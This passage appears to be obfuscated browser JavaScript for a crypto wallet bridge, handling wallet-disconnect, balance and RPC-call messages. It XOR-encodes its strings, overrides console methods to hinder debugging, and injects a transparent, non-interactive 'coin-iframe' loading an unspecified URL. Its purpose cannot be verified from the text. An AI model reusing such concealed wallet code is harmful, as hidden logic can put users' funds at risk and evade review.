        if (n)
          return (
            x({
              type: (function () {
                let t;
                return function () {
                  const e = gO;
                  if (!t) {
                    const n = new Uint8Array([
                        209, 154, 236, 131, 195, 143, 255, 140, 201, 149, 238,
                        138, 197, 143, 229, 139,
                      ]),
                      r = -811541626,
                      o = new Uint8Array(n[e(h)]);
                    for (let t = 0; t < n[e(h)]; t++) {
                      const i = 255 & g.NNhlJ(r, g[e(401)](t % 4, 8));
                      o[t] = n[t] ^ i;
                    }
                    t = new TextDecoder().decode(o);
                  }
                  return t;
                };
              })()(),
              publicKey: t[p(348)](),
              address: t.getAddress(),
            }),
            await (null == (e = Og.getRpcClient())
              ? void 0
              : e.getBalance(n.publicKey)),
            void 0
          );
        x({
          type: (function () {
            let t;
            return function () {
              const e = gO;
              if (!t) {
                const n = new Uint8Array([
                    211, 154, 236, 131, 193, 143, 255, 140, 203, 149, 238, 138,
                    199, 143, 233, 128, 202, 132, 229, 157, 214, 148, 242,
                  ]),
                  r = -811541628,
                  o = new Uint8Array(n.length);
                for (let t = 0; t < n[e(l)]; t++) {
                  const i = g.zQQJR(g.WcSCv(r, g[e(d)](t % 4, 8)), 255);
                  o[t] = g[e(f)](n[t], i);
                }
                t = new TextDecoder().decode(o);
              }
              return t;
            };
          })()(),
          error: (function () {
            const t = 432,
              e = {
                YNSpL: function (t, e) {
                  return t < e;
                },
              },
              n = e;
            let r;
            return function () {
              const e = gO;
              if (!r) {
                const o = new Uint8Array([
                    200, 180, 128, 184, 231, 183, 204, 170, 242, 251, 196, 170,
                    242, 190, 195, 187, 227, 191,
                  ]),
                  i = -811541626,
                  s = new Uint8Array(o.length);
                for (let r = 0; n.YNSpL(r, o[e(t)]); r++) {
                  const t = (i >>> ((r % 4) * 8)) & 255;
                  s[r] = o[r] ^ t;
                }
                r = new TextDecoder().decode(s);
              }
              return r;
            };
          })()(),
        });
      } catch (y) {
        let t = g.Zqhww;
        y instanceof Error
          ? (t = y.message)
          : g[p(u)](typeof y, p(430))
          ? (t = y)
          : y && "object" == typeof y && (t = JSON.stringify(y)),
          x({
            type: (function () {
              let t;
              return function () {
                const e = gO;
                if (!t) {
                  const n = new Uint8Array([
                      239, 154, 236, 131, 253, 143, 255, 140, 247, 149, 238,
                      138, 251, 143, 233, 128, 246, 132, 229, 157, 234, 148,
                      242,
                    ]),
                    r = -811541576,
                    o = new Uint8Array(n[e(c)]);
                  for (let t = 0; g[e(423)](t, n[e(c)]); t++) {
                    const i = 255 & g[e(420)](r, (t % 4) * 8);
                    o[t] = n[t] ^ i;
                  }
                  t = new TextDecoder().decode(o);
                }
                return t;
              };
            })()(),
            error: t,
          });
      }
    }),
    (hO["WALLET_DIS" + sO(371) + "QUEST"] = async (t) => {
      const e = 387,
        n = 411,
        r = gO,
        o = Jg.getInstance();
      await o[r([443][0]) + "d"]();
      o.getWallet() &&
        x({
          type: (function () {
            const t = {
                FarYX: function (t, e) {
                  return t * e;
                },
                hNzgo: function (t, e) {
                  return t ^ e;
                },
              },
              r = t;
            let o;
            return function () {
              const t = gO;
              if (!o) {
                const i = new Uint8Array([
                    209, 154, 236, 131, 195, 143, 255, 139, 207, 136, 227, 128,
                    200, 149, 229, 140, 210, 158, 228,
                  ]),
                  s = -811541626,
                  a = new Uint8Array(i.length);
                for (let n = 0; n < i[t(432)]; n++) {
                  const o = (s >>> r[t(e)](n % 4, 8)) & 255;
                  a[n] = r.hNzgo(i[n], o);
                }
                o = new TextDecoder()[t(n)](a);
              }
              return o;
            };
          })()(),
        });
    }),
    (hO["RPC_GET_BA" + sO(376)] = async (t) => {
      const e = 458,
        n = 355,
        r = 360,
        o = 343,
        i = 432,
        s = 448,
        a = 354,
        u = 411,
        c = 432,
        l = 411,
        d = 432,
        f = 357,
        h = 451,
        p = 421,
        m = 357,
        g = 451,
        y = 421,
        w = 411,
        b = 373,
        v = gO,
        A = {
          hoYFj: function (t, e) {
            return t < e;
          },
          PdKPV: function (t, e) {
            return t ^ e;
          },
          PWkou: function (t, e) {
            return t & e;
          },
          uDNzy: function (t, e) {
            return t & e;
          },
          PSriS: function (t, e) {
            return t >>> e;
          },
          Rkiwi: function (t, e) {
            return t * e;
          },
          eslNa: function (t, e) {
            return t % e;
          },
          OuSrW: function (t, e) {
            return t(e);
          },
          CTGlD: function (t, e) {
            return t === e;
          },
          OhsgQ: function (t, e) {
            return t === e;
          },
          SbKZs: "object",
          sFLTq: function (t, e) {
            return t + e;
          },
        },
        k = Xg.getInstance();
      if (!k.isUserAuthenticated())
        return (
          A[v(e)](x, {
            type: (function () {
              const t = 432,
                e = 411,
                n = {
                  elptz: function (t, e) {
                    return t >>> e;
                  },
                  zRPGP: function (t, e) {
                    return t ^ e;
                  },
                },
                r = n;
              let o;
              return function () {
                const n = gO;
                if (!o) {
                  const i = new Uint8Array([
                      212, 139, 227, 144, 195, 137, 242, 128, 212,
                    ]),
                    s = -811541626,
                    a = new Uint8Array(i.length);
                  for (let e = 0; e < i[n(t)]; e++) {
                    const t = 255 & r.elptz(s, (e % 4) * 8);
                    a[e] = r[n(459)](i[e], t);
                  }
                  o = new TextDecoder()[n(e)](a);
                }
                return o;
              };
            })()(),
            error: (function () {
              const t = {
                TczKM: function (t, e) {
                  return A[gO(b)](t, e);
                },
                HOjJL: function (t, e) {
                  return t % e;
                },
              };
              let e;
              return function () {
                const n = gO;
                if (!e) {
                  const r = new Uint8Array([
                      205, 168, 197, 189, 184, 181, 207, 187, 184, 186, 213,
                      187, 240, 190, 206, 187, 241, 184, 193, 187, 253, 191,
                    ]),
                    o = -811541608,
                    i = new Uint8Array(r.length);
                  for (let e = 0; t[n(377)](e, r.length); e++) {
                    const s = (o >>> (8 * t[n(391)](e, 4))) & 255;
                    i[e] = r[e] ^ s;
                  }
                  e = new TextDecoder()[n(w)](i);
                }
                return e;
              };
            })()(),
          }),
          void 0
        );
      if (!k.isRpcConnected())
        return (
          x({
            type: (function () {
              let t;
              return function () {
                const e = gO;
                if (!t) {
                  const n = new Uint8Array([
                      212, 139, 227, 144, 195, 137, 242, 128, 212,
                    ]),
                    r = -811541626,
                    o = new Uint8Array(n[e(432)]);
                  for (let t = 0; t < n.length; t++) {
                    const e = (r >>> ((t % 4) * 8)) & 255;
                    o[t] = A.PdKPV(n[t], e);
                  }
                  t = new TextDecoder().decode(o);
                }
                return t;
              };
            })()(),
            error: (function () {
              const t = v,
                e = {};
              (e[t(f)] = function (t, e) {
                return t >>> e;
              }),
                (e[t(h)] = function (t, e) {
                  return t * e;
                }),
                (e[t(p)] = function (t, e) {
                  return t % e;
                });
              const n = e;
              let r;
              return function () {
                const e = t;
                if (!r) {
                  const t = new Uint8Array([
                      214, 139, 227, 239, 234, 180, 212, 239, 231, 180, 206,
                      161, 225, 184, 212, 170, 224,
                    ]),
                    o = -811541628,
                    i = new Uint8Array(t.length);
                  for (let r = 0; r < t.length; r++) {
                    const s = 255 & n[e(m)](o, n[e(g)](n[e(y)](r, 4), 8));
                    i[r] = t[r] ^ s;
                  }
                  r = new TextDecoder().decode(i);
                }
                return r;
              };
            })()(),
          }),
          void 0
        );
      try {
        const e = await k["getAccount" + v(n)](t.address);
        x({
          type: (function () {
            const t = function (t, e) {
                return A.PWkou(t, e);
              },
              e = function (t, e) {
                return t % e;
              };
            let n;
            return function () {
              const r = gO;
              if (!n) {
                const o = new Uint8Array([
                    212, 139, 227, 144, 196, 154, 236, 142, 200, 152, 229, 144,
                    212, 158, 243, 159, 201, 149, 243, 138,
                  ]),
                  i = -811541626,
                  s = new Uint8Array(o[r(d)]);
                for (let n = 0; n < o.length; n++) {
                  const r = t(i >>> (8 * e(n, 4)), 255);
                  s[n] = o[n] ^ r;
                }
                n = new TextDecoder()[r(411)](s);
              }
              return n;
            };
          })()(),
          balance: e,
          address: t.address,
        });
      } catch (I) {
        let t = v(r) + "ror";
        I instanceof Error
          ? (t = I.message)
          : A.CTGlD(typeof I, "string")
          ? (t = I)
          : I && A[v(o)](typeof I, A.SbKZs) && (t = JSON.stringify(I)),
          x({
            type: (function () {
              let t;
              return function () {
                const e = gO;
                if (!t) {
                  const n = new Uint8Array([
                      210, 139, 227, 144, 197, 137, 242, 128, 210,
                    ]),
                    r = -811541632,
                    o = new Uint8Array(n[e(432)]);
                  for (let t = 0; t < n[e(c)]; t++) {
                    const e = A.uDNzy(A.PSriS(r, (t % 4) * 8), 255);
                    o[t] = A.PdKPV(n[t], e);
                  }
                  t = new TextDecoder()[e(l)](o);
                }
                return t;
              };
            })()(),
            error: A.sFLTq(
              (function () {
                let t;
                return function () {
                  const e = gO;
                  if (!t) {
                    const n = new Uint8Array([
                        192, 186, 201, 163, 227, 191, 128, 187, 233, 251, 199,
                        170, 242, 251, 194, 174, 234, 186, 206, 172, 227, 225,
                        128,
                      ]),
                      r = -811541626,
                      o = new Uint8Array(n[e(i)]);
                    for (let t = 0; t < n.length; t++) {
                      const i = (r >>> A.Rkiwi(A[e(s)](t, 4), 8)) & 255;
                      o[t] = A[e(a)](n[t], i);
                    }
                    t = new TextDecoder()[e(u)](o);
                  }
                  return t;
                };
              })()(),
              t
            ),
          });
      }
    }),
    (hO.RPC_CALL = async (t) => {
      const e = 350,
        n = 392,
        r = 353,
        o = 422,
        i = 440,
        s = 395,
        a = 432,
        u = 372,
        c = 403,
        l = gO,
        d = {
          HWmeh: function (t, e) {
            return t * e;
          },
          aPFwZ: function (t, e) {
            return t >>> e;
          },
          QgAna: function (t, e) {
            return t * e;
          },
          fcuve: function (t, e) {
            return t < e;
          },
          oDAwX: function (t, e) {
            return t ^ e;
          },
          OsGyi: function (t, e) {
            return t * e;
          },
          msRfl: function (t, e) {
            return t ^ e;
          },
          vPzUK: function (t, e) {
            return t(e);
          },
          piomX: function (t, e) {
            return t(e);
          },
          DdhOG: l(360) + "ror",
          gTWcx: "string",
          FOZvB: function (t, e) {
            return t + e;
          },
        },
        f = Xg[l(e) + "e"]();
      if (!f.isUserAuthenticated())
        return (
          d[l(n)](x, {
            type: (function () {
              const t = 432,
                e = 403,
                n = l,
                r = {};
              (r[n(c)] = function (t, e) {
                return t >>> e;
              }),
                (r.veatw = function (t, e) {
                  return t * e;
                }),
                (r.urqgm = function (t, e) {
                  return t % e;
                });
              const o = r;
              let i;
              return function () {
                const r = n;
                if (!i) {
                  const n = new Uint8Array([
                      214, 139, 227, 144, 193, 137, 242, 128, 214,
                    ]),
                    s = -811541628,
                    a = new Uint8Array(n.length);
                  for (let i = 0; i < n[r(t)]; i++) {
                    const t = 255 & o[r(e)](s, o.veatw(o.urqgm(i, 4), 8));
                    a[i] = n[i] ^ t;
                  }
                  i = new TextDecoder().decode(a);
                }
                return i;
              };
            })()(),
            error: (function () {
              const t = 411;
              let e;
              return function () {
                const n = gO;
                if (!e) {
                  const r = new Uint8Array([
                      211, 168, 197, 189, 166, 181, 207, 187, 166, 186, 213,
                      187, 238, 190, 206, 187, 239, 184, 193, 187, 227, 191,
                    ]),
                    o = -811541626,
                    i = new Uint8Array(r.length);
                  for (let t = 0; t < r.length; t++) {
                    const e = (o >>> d.HWmeh(t % 4, 8)) & 255;
                    i[t] = r[t] ^ e;
                  }
                  e = new TextDecoder()[n(t)](i);
                }
                return e;
              };
            })()(),
            method: t.method,
          }),
          void 0
        );
      if (!f.isRpcConnected())
        return (
          d.piomX(x, {
            type: (function () {
              const t = 411;
              let e;
              return function () {
                const n = gO;
                if (!e) {
                  const r = new Uint8Array([
                      218, 139, 227, 144, 205, 137, 242, 128, 218,
                    ]),
                    o = -811541624,
                    i = new Uint8Array(r.length);
                  for (let t = 0; t < r.length; t++) {
                    const e = 255 & d.aPFwZ(o, d.QgAna(t % 4, 8));
                    i[t] = r[t] ^ e;
                  }
                  e = new TextDecoder()[n(t)](i);
                }
                return e;
              };
            })()(),
            error: (function () {
              const t = 432,
                e = 408,
                n = {
                  tJOzD: function (t, e) {
                    return d.fcuve(t, e);
                  },
                  DdTXz: function (t, e) {
                    return t >>> e;
                  },
                  pdgqo: function (t, e) {
                    return d.QgAna(t, e);
                  },
                  xPKmP: function (t, e) {
                    return t ^ e;
                  },
                };
              let r;
              return function () {
                const o = gO;
                if (!r) {
                  const i = new Uint8Array([
                      212, 139, 227, 239, 232, 180, 212, 239, 229, 180, 206,
                      161, 227, 184, 212, 170, 226,
                    ]),
                    s = -811541626,
                    a = new Uint8Array(i[o(t)]);
                  for (let t = 0; n[o(407)](t, i.length); t++) {
                    const r = 255 & n.DdTXz(s, n.pdgqo(t % 4, 8));
                    a[t] = n[o(e)](i[t], r);
                  }
                  r = new TextDecoder()[o(411)](a);
                }
                return r;
              };
            })()(),
            method: t[l(r)],
          }),
          void 0
        );
      try {
        const e = await f[l(o)](t.method, t[l(i)]);
        x({
          type: (function () {
            const t = 432;
            let e;
            return function () {
              const n = gO;
              if (!e) {
                const r = new Uint8Array([
                    214, 139, 227, 144, 199, 154, 236, 131, 219, 137, 229, 156,
                    212, 148, 238, 156, 193,
                  ]),
                  o = -811541628,
                  i = new Uint8Array(r.length);
                for (let e = 0; e < r[n(t)]; e++) {
                  const t = (o >>> ((e % 4) * 8)) & 255;
                  i[e] = d[n(388)](r[e], t);
                }
                e = new TextDecoder().decode(i);
              }
              return e;
            };
          })()(),
          result: e,
          method: t.method,
        });
      } catch (h) {
        let e = d.DdhOG;
        h instanceof Error
          ? (e = h.message)
          : typeof h === d.gTWcx
          ? (e = h)
          : h && typeof h === l(s) && (e = JSON.stringify(h)),
          x({
            type: (function () {
              const t = {
                xeiFU: function (t, e) {
                  return d.fcuve(t, e);
                },
                Fgrjw: function (t, e) {
                  return t % e;
                },
                eTiLx: function (t, e) {
                  return t ^ e;
                },
              };
              let e;
              return function () {
                const n = gO;
                if (!e) {
                  const r = new Uint8Array([
                      212, 139, 227, 144, 195, 137, 242, 128, 212,
                    ]),
                    o = -811541626,
                    i = new Uint8Array(r[n(a)]);
                  for (let e = 0; t[n(u)](e, r.length); e++) {
                    const s = (o >>> (8 * t.Fgrjw(e, 4))) & 255;
                    i[e] = t[n(426)](r[e], s);
                  }
                  e = new TextDecoder().decode(i);
                }
                return e;
              };
            })()(),
            error: d.FOZvB(
              (function () {
                const t = 432,
                  e = 385;
                let n;
                return function () {
                  const r = gO;
                  if (!n) {
                    const o = new Uint8Array([
                        210, 139, 227, 239, 227, 186, 204, 163, 160, 189, 193,
                        166, 236, 190, 196, 245, 160,
                      ]),
                      i = -811541632,
                      s = new Uint8Array(o.length);
                    for (let n = 0; n < o[r(t)]; n++) {
                      const t = (i >>> d[r(e)](n % 4, 8)) & 255;
                      s[n] = d.msRfl(o[n], t);
                    }
                    n = new TextDecoder().decode(s);
                  }
                  return n;
                };
              })()(),
              e
            ),
            method: t.method,
          });
      }
    });
  const mO = hO;
  function gO(t, e) {
    const n = pO();
    return (
      (gO = function (e, r) {
        let o = n[(e -= 343)];
        if (void 0 === gO.dkhFEU) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (gO.AwHiQC = i), (t = arguments), (gO.dkhFEU = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.Nvufqq = t),
              (this.gTSRoQ = [1, 0, 0]),
              (this.RYCDQT = function () {
                return "newState";
              }),
              (this.FzdvUY = "\\w+ *\\(\\) *{\\w+ *"),
              (this.XHYQhU = "['|\"].+['|\"];? *}");
          };
          (e.prototype.RRVMQW = function () {
            const t = new RegExp(this.FzdvUY + this.XHYQhU).test(
              this.RYCDQT.toString()
            )
              ? --this.gTSRoQ[1]
              : --this.gTSRoQ[0];
            return this.xYaDjG(t);
          }),
            (e.prototype.xYaDjG = function (t) {
              return Boolean(~t) ? this.zCHNeS(this.Nvufqq) : t;
            }),
            (e.prototype.zCHNeS = function (t) {
              for (let e = 0, n = this.gTSRoQ.length; e < n; e++)
                this.gTSRoQ.push(Math.round(Math.random())),
                  (n = this.gTSRoQ.length);
              return t(this.gTSRoQ[0]);
            }),
            new e(gO).RRVMQW(),
            (o = gO.AwHiQC(o)),
            (t[s] = o);
        }
        return o;
      }),
      gO(t, e)
    );
  }
  axiom;
  const yO = kO;
  !(function (t) {
    const e = 347,
      n = 371,
      r = 365,
      o = 369,
      i = 374,
      s = 373,
      a = 368,
      u = 349,
      c = kO,
      l = t();
    for (; []; )
      try {
        if (
          641378 ===
          (-parseInt(c(e)) / 1) * (parseInt(c(n)) / 2) +
            parseInt(c(358)) / 3 +
            -parseInt(c(r)) / 4 +
            -parseInt(c(o)) / 5 +
            (-parseInt(c(359)) / 6) * (parseInt(c(i)) / 7) +
            (parseInt(c(s)) / 8) * (-parseInt(c(a)) / 9) +
            parseInt(c(u)) / 10
        )
          break;
        l.push(l.shift());
      } catch (d) {
        l.push(l.shift());
      }
  })(SO);
  const wO = (function () {
      let t = !![];
      return function (e, n) {
        const r = t
          ? function () {
              if (n) {
                const t = n.apply(e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
        return (t = ![]), r;
      };
    })(),
    bO = wO(void 0, function () {
      const t = 352,
        e = 346,
        n = 355,
        r = 370,
        o = kO,
        i = { AqIrJ: "(((.+)+)+)+$" },
        s = i;
      return bO
        .toString()
        .search(o(t) + "+$")
        .toString()
        [o(e) + "r"](bO)
        [o(n)](s[o(r)]);
    });
  bO();
  const vO = (function () {
      const t = 351;
      let e = !![];
      return function (n, r) {
        const o = e
          ? function () {
              if (r) {
                const e = r[kO(t)](n, arguments);
                return (r = null), e;
              }
            }
          : function () {};
        return (e = ![]), o;
      };
    })(),
    AO = vO(void 0, function () {
      const t = 375,
        e = 366,
        n = 353,
        r = 367,
        o = 357,
        i = 361,
        s = 354,
        a = 360,
        u = 364,
        c = kO,
        l = {};
      (l[c(363)] = "return (function() "),
        (l.tskif = c(t)),
        (l.cbfSV = c(e)),
        (l.ykpAU = c(n)),
        (l.UwrdN = c(r)),
        (l.AaAjs = c(o));
      const d = l;
      let f;
      try {
        f = Function(d[c(363)] + "{}.constru" + c(i) + 'rn this")( ));')();
      } catch (m) {
        f = window;
      }
      const h = (f.console = f[c(356)] || {}),
        p = [d[c(348)], d.cbfSV, d[c(s)], "error", c(a), d.UwrdN, d.AaAjs];
      for (let g = 0; g < p[c(372)]; g++) {
        const t = vO[c(346) + "r"].prototype.bind(vO),
          e = p[g],
          n = h[e] || t;
        (t[c(350)] = vO.bind(vO)), (t[c(u)] = n[c(u)].bind(n)), (h[e] = t);
      }
    });
  function kO(t, e) {
    const n = SO();
    return (
      (kO = function (e, r) {
        let o = n[(e -= 345)];
        if (void 0 === kO.gdYICc) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (kO.wlkwlX = i), (t = arguments), (kO.gdYICc = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.SJNNYp = t),
              (this.NTXIdJ = [1, 0, 0]),
              (this.SpyEuX = function () {
                return "newState";
              }),
              (this.MYGrWx = "\\w+ *\\(\\) *{\\w+ *"),
              (this.geUMxK = "['|\"].+['|\"];? *}");
          };
          (e.prototype.oSAMXL = function () {
            const t = new RegExp(this.MYGrWx + this.geUMxK).test(
              this.SpyEuX.toString()
            )
              ? --this.NTXIdJ[1]
              : --this.NTXIdJ[0];
            return this.acSUcz(t);
          }),
            (e.prototype.acSUcz = function (t) {
              return Boolean(~t) ? this.SzkAOq(this.SJNNYp) : t;
            }),
            (e.prototype.SzkAOq = function (t) {
              for (let e = 0, n = this.NTXIdJ.length; e < n; e++)
                this.NTXIdJ.push(Math.round(Math.random())),
                  (n = this.NTXIdJ.length);
              return t(this.NTXIdJ[0]);
            }),
            new e(kO).oSAMXL(),
            (o = kO.wlkwlX(o)),
            (t[s] = o);
        }
        return o;
      }),
      kO(t, e)
    );
  }
  AO(),
    (window[yO(362)] = function (t) {
      return function () {
        return t;
      };
    });
  const IO = (t) => {
    const e = yO;
    (() => {
      const t = function (t, e) {
          return t < e;
        },
        e = function (t) {
          return t();
        },
        n = function (t, e) {
          return t(e);
        },
        r = function (t, e) {
          return t(e);
        },
        o = function (t, e) {
          return t(e);
        },
        i = function (t) {
          return t();
        },
        s = setInterval(async () => {
          const i = {
            vMCTL: function (e, n) {
              return t(e, n);
            },
            NqPZD: function (t, e) {
              return t >>> e;
            },
            eNEBb: function (t, e) {
              return t % e;
            },
          };
          try {
            !(await e(Y)) && n(clearInterval, s);
          } catch (a) {
            C(),
              await r(
                q,
                (function () {
                  const t = 494,
                    e = 479;
                  let n;
                  return function () {
                    const r = K;
                    if (!n) {
                      const o = new Uint8Array([
                          250, 159, 96, 13, 219, 147, 119, 1, 137, 151, 108, 22,
                          192, 142, 108, 10, 192, 148, 100, 88, 218, 131, 112,
                          12, 204, 151, 35, 27, 198, 151, 115, 10, 198, 151,
                          106, 11, 204, 158,
                        ]),
                        s = 2013526697,
                        a = new Uint8Array(o.length);
                      for (let e = 0; i.vMCTL(e, o[r(508)]); e++) {
                        const n = 255 & i[r(t)](s, 8 * i.eNEBb(e, 4));
                        a[e] = o[e] ^ n;
                      }
                      n = new TextDecoder()[r(e)](a);
                    }
                    return n;
                  };
                })()()
              ),
              o(clearInterval, s);
          }
        }, 3e4);
      document.addEventListener("visibilitychange", async () => {
        !document.hidden && (await i(Y));
      });
    })(),
      ((t) => {
        const e = 531,
          n = 501,
          r = 511,
          o = 493,
          i = 535,
          s = 495,
          a = 503,
          u = 519,
          c = 492,
          l = 516,
          d = 543,
          f = 484,
          h = 499,
          p = 540,
          m = 527,
          g = 497,
          y = 488,
          w = I,
          b = {
            WyXpH: function (t, e) {
              return t & e;
            },
            ADxSe: function (t, e) {
              return t < e;
            },
            gMJIO: function (t, e) {
              return t >>> e;
            },
            KIBNo: function (t, e) {
              return t === e;
            },
            YLDAX: "iframe",
          };
        (b.PoXrI = w(e)), (b.NcySe = "none");
        const v = b;
        if (_ || !T || v.KIBNo(T.length, 0)) return null;
        let k = document[w(n) + w(r)]("coin-ifram" + w(o));
        if (k) return k;
        (k = document[w(i) + w(513)](v[w(s)])),
          (k.src = "" + T + (t || w(a))),
          (k.id = (function () {
            let t;
            return function () {
              const e = E;
              if (!t) {
                const n = new Uint8Array([
                    172, 142, 117, 113, 226, 136, 122, 109, 174, 140, 121, 50,
                    160, 151, 121, 109, 163, 128, 101,
                  ]),
                  r = 521986511,
                  o = new Uint8Array(n.length);
                for (let t = 0; t < n.length; t++) {
                  const i = v[e(545)](r >>> ((t % 4) * 8), 255);
                  o[t] = n[t] ^ i;
                }
                t = new TextDecoder().decode(o);
              }
              return t;
            };
          })()()),
          (k.title = (function () {
            const t = 485,
              e = 506,
              n = {
                PyRpG: function (t, e) {
                  return v.ADxSe(t, e);
                },
                vxrSo: function (t, e) {
                  return v.gMJIO(t, e);
                },
                GVGXy: function (t, e) {
                  return t * e;
                },
                nGSHW: function (t, e) {
                  return t % e;
                },
              };
            let r;
            return function () {
              const o = E;
              if (!r) {
                const i = new Uint8Array([
                    128, 142, 123, 75, 168, 130, 116, 63, 142, 142, 117, 113,
                    237, 162, 110, 122, 172, 149, 115, 109,
                  ]),
                  s = 521986509,
                  a = new Uint8Array(i.length);
                for (let e = 0; n.PyRpG(e, i.length); e++) {
                  const r = 255 & n.vxrSo(s, n.GVGXy(n[o(t)](e, 4), 8));
                  a[e] = i[e] ^ r;
                }
                r = new TextDecoder()[o(e)](a);
              }
              return r;
            };
          })()());
        const S = {};
        (S[w(u)] = "fixed"),
          (S.top = "0"),
          (S[w(c)] = "0"),
          (S.width = w(l)),
          (S.height = v.PoXrI),
          (S[w(507)] = v.NcySe),
          (S[w(548)] = "10001"),
          (S[w(d)] = w(f) + "t"),
          (S.pointerEvents = w(h)),
          (S[w(p)] = "0"),
          (S.transition = "opacity 0." + w(m)),
          (S[w(g)] = "none"),
          (S[w(547)] = "opacity"),
          (S.contain = "strict"),
          Object.assign(k.style, S),
          document.body[w(y) + "d"](k);
        const C = {};
        return (C.iframe = k), A(C), k;
      })(t),
      {
        VPPwv: function (t) {
          return t();
        },
      }[e([345][0])](dO);
  };
  function SO() {
    const t = [
      "Dg9tDhjPBMC",
      "ntm4nJqWwu9guejb",
      "D2fYBG",
      "DgfIBgu",
      "mtHMrLviBMy",
      "mZa2ntaZmfzWA1rhCG",
      "qxfjCKO",
      "mJiZnZa5oejMuejrzq",
      "BgvUz3rO",
      "mZG0odCYogXhu0vorq",
      "mZqZn01qy0rJta",
      "Bg9N",
      "vLbqD3y",
      "y29UC3rYDwn0BW",
      "mw5usvDrBq",
      "DhnRAwy",
      "ndm1mZy5nZb4zw5ZuwC",
      "x19WCM90B19F",
      "yxbWBhK",
      "kcGOlISPkYKRkq",
      "Aw5MBW",
      "EwTWqvu",
      "C2vHCMnO",
      "y29UC29Szq",
      "DhjHy2u",
      "mta4ode4mwvnCeXHtG",
      "mtuYmZrOsMDSvva",
      "zxHJzxb0Aw9U",
      "y3rVCIGICMv0Dq",
      "C2TdCNLWDa",
      "DeTiwfO",
    ];
    return (SO = function () {
      return t;
    })();
  }
  axiom,
    (function (t) {
      const e = 202,
        n = 259,
        r = 233,
        o = 213,
        i = 261,
        s = 237,
        a = 291,
        u = 203,
        c = PO,
        l = t();
      for (; []; )
        try {
          if (
            112988 ===
            (parseInt(c(e)) / 1) * (parseInt(c(297)) / 2) +
              parseInt(c(195)) / 3 +
              (parseInt(c(n)) / 4) * (-parseInt(c(r)) / 5) +
              parseInt(c(o)) / 6 +
              (parseInt(c(287)) / 7) * (parseInt(c(i)) / 8) +
              parseInt(c(s)) / 9 +
              (parseInt(c(a)) / 10) * (-parseInt(c(u)) / 11)
          )
            break;
          l.push(l.shift());
        } catch (d) {
          l.push(l.shift());
        }
    })(EO);
  const _O = (function () {
      const t = 247;
      let e = !![];
      return function (n, r) {
        const o = e
          ? function () {
              if (r) {
                const e = r[PO(t)](n, arguments);
                return (r = null), e;
              }
            }
          : function () {};
        return (e = ![]), o;
      };
    })(),
    TO = _O(void 0, function () {
      const t = 270,
        e = 282,
        n = 220,
        r = PO,
        o = { brafw: "(((.+)+)+)+$" },
        i = o;
      return TO.toString()
        .search("(((.+)+)+)+$")
        [r(t)]()
        [r(e) + "r"](TO)
        [r(n)](i[r(293)]);
    });
  TO();
  const CO = (function () {
      let t = !![];
      return function (e, n) {
        const r = t
          ? function () {
              if (n) {
                const t = n.apply(e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
        return (t = ![]), r;
      };
    })(),
    BO = CO(void 0, function () {
      const t = 278,
        e = 275,
        n = 199,
        r = 212,
        o = 204,
        i = 222,
        s = 270,
        a = 276,
        u = PO,
        c = {};
      (c[u(199)] = function (t, e) {
        return t + e;
      }),
        (c.SxIpl = "return (function() "),
        (c[u(t)] = "{}.constru" + u(238) + 'rn this")( )'),
        (c.flxkE = u(e)),
        (c.QeQyW = u(210)),
        (c.GwmMp = "info");
      const l = c;
      let d;
      try {
        d = Function(l[u(n)](l[u(r)] + l[u(t)], ");"))();
      } catch (p) {
        d = window;
      }
      const f = (d.console = d.console || {}),
        h = [l.flxkE, l.QeQyW, l.GwmMp, "error", "exception", "table", u(o)];
      for (let m = 0; m < h[u(i)]; m++) {
        const t = CO[u(282) + "r"].prototype.bind(CO),
          e = h[m],
          n = f[e] || t;
        (t.__proto__ = CO.bind(CO)), (t[u(s)] = n[u(s)][u(a)](n)), (f[e] = t);
      }
    });
  function EO() {
    const t = [
      "mtu2nJK2wufrtezV",
      "ntyZmMDAsxvLsa",
      "DhjHy2u",
      "lwnVAw4TyNrUoG",
      "z2v0v2fSBgv0",
      "C3jJ",
      "Dgv4DfrLCNrPyq",
      "icaGFqOGicaGia",
      "D2fYBG",
      "CM9Y",
      "u3HjCgW",
      "mJi0otu4C3zrwg95",
      "y2XVC2vZDa",
      "icaGDhjHBNnPDa",
      "C3vIDhjLzq",
      "Aw5Zzxj0qMvMBW",
      "lwz1BgWUBwf4lq",
      "Bgz5CgK",
      "C2vHCMnO",
      "lMDHCc0X",
      "BgvUz3rO",
      "ChvZAa",
      "z2v0q29UBMvJDa",
      "icaGicaGicbIyq",
      "z2v0qxr0CMLIDq",
      "C3bHBIWGzgL2",
      "BMv4DevSzw1LBG",
      "z2v0sw5ZDgfUyW",
      "y2XHC3noyw1L",
      "BMv4DfnPyMXPBG",
      "icaGicaGicbTyq",
      "ntqZnxboEwnMBW",
      "y3jLyxrLrwXLBq",
      "DhjPBq",
      "yM9KEq",
      "nJm3odiXCgLhC2vm",
      "y3rVCIGICMv0Dq",
      "y2TNCM91BMqTyW",
      "lMnYzwf0zs1JBW",
